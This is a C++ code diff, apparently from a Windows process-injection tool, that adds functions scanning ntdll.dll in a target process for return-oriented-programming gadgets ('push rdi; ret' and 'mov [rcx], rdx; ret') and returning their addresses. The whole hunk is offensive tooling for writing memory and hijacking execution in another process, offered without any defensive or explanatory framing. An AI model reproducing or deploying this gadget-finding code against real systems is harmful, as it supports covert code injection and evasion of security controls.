@@ -140,8 +140,42 @@ namespace
         return meNtdll.modBaseAddr + peNtdll.BufferToRVA(loopGadgetPtr);
     }
 
+    // push rdi; ret;
+    BYTE* FindPushGadget(Process& proc)
+    {
+        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
+        PE peNtdll = PE(meNtdll.szExePath);
+
+        BYTE* pushGadgetPtr = peNtdll.ScanSections((BYTE*)"\x57\xC3", "..", true);
+        if (!pushGadgetPtr)
+        {
+            std::cerr << "Could not find push gadget\n";
+            return 0;
+        }
+        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(pushGadgetPtr);
+    }
+
+    // mov qword ptr [rcx], rdx; ret;
     BYTE* FindWriteGadget(Process& proc)
     {
-        return 0;
+        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
+        PE peNtdll = PE(meNtdll.szExePath);
+
+        BYTE* writeGadgetPtr = nullptr;
+        if (proc.is32Bits)
+        {
+            writeGadgetPtr = peNtdll.ScanSections((BYTE*)"\x89\x11\xC3", "...", true);
+        }
+        else
+        {
+            writeGadgetPtr = peNtdll.ScanSections((BYTE*)"\x48\x89\x11\xC3", "....", true);
+        }
+
+        if (!writeGadgetPtr)
+        {
+            std::cerr << "Could not find write gadget\n";
+            return 0;
+        }
+        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(writeGadgetPtr);
     }
 }
